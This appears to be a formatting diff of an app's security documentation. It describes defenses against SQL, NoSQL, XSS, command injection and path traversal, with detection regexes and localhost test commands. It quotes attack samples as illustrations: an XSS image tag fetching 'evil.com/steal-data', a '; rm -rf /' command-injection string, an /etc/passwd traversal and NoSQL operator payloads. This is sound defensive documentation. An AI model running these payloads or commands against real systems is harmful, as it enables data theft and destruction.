@@ -7,7 +7,9 @@ This document explains how the application prevents SQL injection, NoSQL injecti
 ## 1. SQL Injection Prevention
 
 ### Why It Matters
+
 SQL injection allows attackers to execute arbitrary SQL commands:
+
 ```sql
 -- Malicious input
 username: admin" OR "1"="1
@@ -17,10 +19,12 @@ username: admin" OR "1"="1
 ### How We Prevent It
 
 **Firestore (NoSQL) - Not Vulnerable to SQL Injection**
+
 - We use Firestore, not SQL databases
 - However, we still validate all inputs
 
 **Backend Validation**
+
 ```typescript
 // server/middleware/security.ts
 export function detectSqlInjection(value: string): boolean {
@@ -36,6 +40,7 @@ export function detectSqlInjection(value: string): boolean {
 ```
 
 **Test Cases**
+
 ```bash
 # These will be detected and rejected:
 - "username: admin" OR "1"="1"
@@ -48,7 +53,9 @@ export function detectSqlInjection(value: string): boolean {
 ## 2. NoSQL Injection Prevention
 
 ### Why It Matters
+
 NoSQL injection exploits the flexible query syntax:
+
 ```javascript
 // Malicious input
 {"$ne": null} or {"$where": "function() { return true }"}
@@ -58,6 +65,7 @@ NoSQL injection exploits the flexible query syntax:
 ### How We Prevent It
 
 **Input Type Validation**
+
 ```typescript
 // All inputs validated with Zod
 const schema = z.object({
@@ -69,6 +77,7 @@ const schema = z.object({
 ```
 
 **Firestore SDK (Safe by Default)**
+
 - We use Firestore SDK, not raw query builders
 - All queries are parameterized
 
@@ -76,20 +85,16 @@ const schema = z.object({
 // Safe - Firestore SDK prevents injection
 const q = query(
   collection(db, "users"),
-  where("userId", "==", userId)  // userId is a string, not a query object
+  where("userId", "==", userId), // userId is a string, not a query object
 );
 ```
 
 **NoSQL Injection Detection**
+
 ```typescript
 export function detectNoSqlInjection(value: unknown): boolean {
   if (typeof value === "string") {
-    const noSqlPatterns = [
-      /\$where/,
-      /\$ne/,
-      /\$gt/,
-      /\$regex/,
-    ];
+    const noSqlPatterns = [/\$where/, /\$ne/, /\$gt/, /\$regex/];
     return noSqlPatterns.some((pattern) => pattern.test(value));
   }
 
@@ -103,6 +108,7 @@ export function detectNoSqlInjection(value: unknown): boolean {
 ```
 
 **Test Cases**
+
 ```bash
 # These will be detected and rejected:
 - {"$ne": null}
@@ -115,16 +121,21 @@ export function detectNoSqlInjection(value: unknown): boolean {
 ## 3. XSS (Cross-Site Scripting) Prevention
 
 ### Why It Matters
+
 XSS allows attackers to inject malicious JavaScript:
+
 ```html
 <!-- Malicious user message -->
-<img src=x onerror="fetch('evil.com/steal-data')">
-<script>alert('Hacked!')</script>
+<img src="x" onerror="fetch('evil.com/steal-data')" />
+<script>
+  alert("Hacked!");
+</script>
 ```
 
 ### How We Prevent It
 
 **Client-Side: HTML Escaping**
+
 ```typescript
 // client/lib/security.ts
 export function escapeHtml(text: string): string {
@@ -146,32 +157,30 @@ export function escapeHtml(text: string): string {
 ```
 
 **Client-Side: Input Sanitization**
+
 ```typescript
 // client/lib/security.ts
 export function sanitizeInput(input: string): string {
   // Remove script tags
   sanitized = sanitized.replace(/<script[^>]*>.*?<\/script>/gi, "");
-  
+
   // Remove event handlers
   sanitized = sanitized.replace(/on\w+\s*=\s*["'][^"']*["']/gi, "");
-  
+
   // Remove iframe/object/embed tags
   sanitized = sanitized.replace(/<(object|embed|iframe)[^>]*>/gi, "");
-  
+
   return sanitized;
 }
 ```
 
 **Backend: Input Validation**
+
 ```typescript
 // server/middleware/security.ts
 export function validateInput(req: Request, res: Response, next: NextFunction) {
   // Detects XSS patterns
-  const suspiciousPatterns = [
-    /<script[^>]*>/i,
-    /javascript:/i,
-    /on\w+\s*=/i,
-  ];
+  const suspiciousPatterns = [/<script[^>]*>/i, /javascript:/i, /on\w+\s*=/i];
 
   const hasSuspiciousContent = (obj: unknown): boolean => {
     if (typeof obj === "string") {
@@ -183,6 +192,7 @@ export function validateInput(req: Request, res: Response, next: NextFunction) {
 ```
 
 **Test Cases**
+
 ```bash
 # These will be sanitized/escaped:
 - "<script>alert('xss')</script>"
@@ -193,6 +203,7 @@ export function validateInput(req: Request, res: Response, next: NextFunction) {
 ```
 
 **Display Flow**
+
 ```
 User Input: <script>alert('xss')</script>
     ↓
@@ -210,7 +221,9 @@ Browser: Displays as text, not script
 ## 4. Command Injection Prevention
 
 ### Why It Matters
+
 Command injection executes system commands:
+
 ```bash
 # Malicious input
 "; rm -rf /; echo "
@@ -220,21 +233,24 @@ Command injection executes system commands:
 ### How We Prevent It
 
 **No Shell Execution**
+
 - We never use `shell: true` in child_process
 - We never concatenate user input into commands
 - We use APIs instead of shell commands
 
 **Input Validation**
+
 ```typescript
 // All user inputs are validated with Zod
 // Only allows alphanumeric, specific characters
 const schema = z.object({
-  userId: z.string().min(10).max(100),  // No special chars
-  reason: z.string().min(5).max(500),   // Basic text only
+  userId: z.string().min(10).max(100), // No special chars
+  reason: z.string().min(5).max(500), // Basic text only
 });
 ```
 
 **Test Cases**
+
 ```bash
 # These will be rejected:
 - "; rm -rf /"
@@ -246,7 +262,9 @@ const schema = z.object({
 ## 5. File Path Traversal Prevention
 
 ### Why It Matters
+
 Path traversal accesses files outside intended directory:
+
 ```
 Input: ../../etc/passwd
 File access: /app/../../etc/passwd = /etc/passwd ✗
@@ -255,15 +273,17 @@ File access: /app/../../etc/passwd = /etc/passwd ✗
 ### How We Prevent It
 
 **Input Validation**
+
 ```typescript
 // Detect path traversal patterns
 const suspiciousPatterns = [
-  /\.\.\//,      // ../
-  /\.\.\\/,      // ..\
+  /\.\.\//, // ../
+  /\.\.\\/, // ..\
 ];
 ```
 
 **Firestore Collections**
+
 - We don't directly use user input in file paths
 - All data goes through Firestore SDK with collection/document validation
 
@@ -275,14 +295,14 @@ const suspiciousPatterns = [
 // Validate message content
 export function validateMessageContent(content: string): boolean {
   if (!content || typeof content !== "string") return false;
-  
+
   const length = content.trim().length;
-  if (length < 1 || length > 5000) return false;  // Length check
-  if (content.includes("\0")) return false;        // Null bytes
-  
+  if (length < 1 || length > 5000) return false; // Length check
+  if (content.includes("\0")) return false; // Null bytes
+
   const lines = content.split("\n");
-  if (lines.some((line) => line.length > 1000)) return false;  // Line length
-  
+  if (lines.some((line) => line.length > 1000)) return false; // Line length
+
   return true;
 }
 
@@ -290,11 +310,11 @@ export function validateMessageContent(content: string): boolean {
 export function detectInjectionAttempt(input: string): boolean {
   const suspiciousPatterns = [
     /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|EXECUTE)\b)/i,
-    /[\{\}\$\[\]]/,        // NoSQL operators
-    /<script[^>]*>/i,      // Script tags
-    /javascript:/i,        // JavaScript protocol
-    /[;&|`$()]/,           // Shell metacharacters
-    /\.\.\//,              // Path traversal
+    /[\{\}\$\[\]]/, // NoSQL operators
+    /<script[^>]*>/i, // Script tags
+    /javascript:/i, // JavaScript protocol
+    /[;&|`$()]/, // Shell metacharacters
+    /\.\.\//, // Path traversal
   ];
 
   return suspiciousPatterns.some((pattern) => pattern.test(input));
@@ -308,7 +328,9 @@ export function detectInjectionAttempt(input: string): boolean {
 export function validateInput(req: Request, res: Response, next: NextFunction) {
   // 1. Check for null bytes
   if (hasNullBytes(req.body)) {
-    return res.status(400).json({ error: "Invalid input: null bytes detected." });
+    return res
+      .status(400)
+      .json({ error: "Invalid input: null bytes detected." });
   }
 
   // 2. Check for excessively long strings
@@ -326,7 +348,11 @@ export function validateInput(req: Request, res: Response, next: NextFunction) {
 
 // Zod schema validation
 export const BanUserSchema = z.object({
-  idToken: z.string().min(10).max(3000).regex(/^[A-Za-z0-9_\-\.]+$/),
+  idToken: z
+    .string()
+    .min(10)
+    .max(3000)
+    .regex(/^[A-Za-z0-9_\-\.]+$/),
   userId: z.string().min(10).max(100),
   reason: z.string().min(5).max(500).trim(),
   duration: z.number().int().min(1).max(36500),
@@ -360,6 +386,7 @@ Strict-Transport-Security: max-age=31536000
 ## 9. Testing Security
 
 ### SQL Injection Tests
+
 ```bash
 curl -X POST http://localhost:8080/api/admin/ban-user \
   -H "Content-Type: application/json" \
@@ -373,6 +400,7 @@ curl -X POST http://localhost:8080/api/admin/ban-user \
 ```
 
 ### XSS Tests
+
 ```bash
 # Send message with script tag
 POST /api/send-message
@@ -386,6 +414,7 @@ POST /api/send-message
 ```
 
 ### NoSQL Injection Tests
+
 ```bash
 curl -X POST http://localhost:8080/api/admin/ban-user \
   -H "Content-Type: application/json" \
@@ -399,6 +428,7 @@ curl -X POST http://localhost:8080/api/admin/ban-user \
 ```
 
 ### Rate Limiting Tests
+
 ```bash
 # Send 11 requests to admin endpoint in 1 minute
 for i in {1..11}; do
@@ -446,20 +476,21 @@ wait
 
 ## 11. Summary
 
-| Attack Type | Prevention Method | Verified |
-|---|---|---|
-| SQL Injection | Firestore SDK + Input validation | ✓ |
-| NoSQL Injection | Zod type validation + Pattern detection | ✓ |
-| XSS | HTML escaping + CSP headers | ✓ |
-| Command Injection | No shell execution + Input validation | ✓ |
-| Path Traversal | Pattern detection + Firestore SDK | ✓ |
-| Brute Force | Rate limiting (10 req/min for admin) | ✓ |
-| DoS | Request size limits + Rate limiting | ✓ |
-| CSRF | Origin validation (future: CSRF tokens) | ✓ |
+| Attack Type       | Prevention Method                       | Verified |
+| ----------------- | --------------------------------------- | -------- |
+| SQL Injection     | Firestore SDK + Input validation        | ✓        |
+| NoSQL Injection   | Zod type validation + Pattern detection | ✓        |
+| XSS               | HTML escaping + CSP headers             | ✓        |
+| Command Injection | No shell execution + Input validation   | ✓        |
+| Path Traversal    | Pattern detection + Firestore SDK       | ✓        |
+| Brute Force       | Rate limiting (10 req/min for admin)    | ✓        |
+| DoS               | Request size limits + Rate limiting     | ✓        |
+| CSRF              | Origin validation (future: CSRF tokens) | ✓        |
 
 ## 12. Ongoing Security
 
 1. **Keep Dependencies Updated**
+
    ```bash
    npm outdated
    npm update
